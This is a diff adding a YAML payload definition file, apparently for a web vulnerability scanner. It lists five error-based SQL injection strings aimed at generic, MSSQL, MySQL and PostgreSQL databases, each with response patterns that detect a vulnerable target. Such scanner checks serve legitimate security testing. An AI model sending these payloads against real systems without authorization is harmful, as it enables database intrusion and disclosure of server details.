@@ -1,0 +1,40 @@
+id: sqli-error
+name: SQL injection — error-based
+context:
+  any: true
+
+payloads:
+  - value: "' OR '1'='1"
+    detect: { body_contains: "syntax error" }
+    id: sqli-error-01
+    title: "SQL injection — error-based (single quote)"
+    severity: critical
+    cwe: CWE-89
+
+  - value: "1' AND '1'='1' --"
+    detect: { body_contains: "SQL" }
+    id: sqli-error-02
+    title: "SQL injection — error-based (AND clause)"
+    severity: critical
+    cwe: CWE-89
+
+  - value: "1' AND 1=CONVERT(int,(SELECT @@version))--"
+    detect: { body_regex: "Microsoft|SQL Server" }
+    id: sqli-error-03
+    title: "SQL injection — MSSQL version disclosure"
+    severity: critical
+    cwe: CWE-89
+
+  - value: "' AND extractvalue(1,concat(0x7e,version()))--"
+    detect: { body_contains: "XPATH" }
+    id: sqli-error-04
+    title: "SQL injection — MySQL XPATH extractvalue"
+    severity: critical
+    cwe: CWE-89
+
+  - value: "' AND 1=cast((SELECT version()) as int)--"
+    detect: { body_regex: "invalid input syntax|ERROR" }
+    id: sqli-error-05
+    title: "SQL injection — PostgreSQL cast error"
+    severity: critical
+    cwe: CWE-89
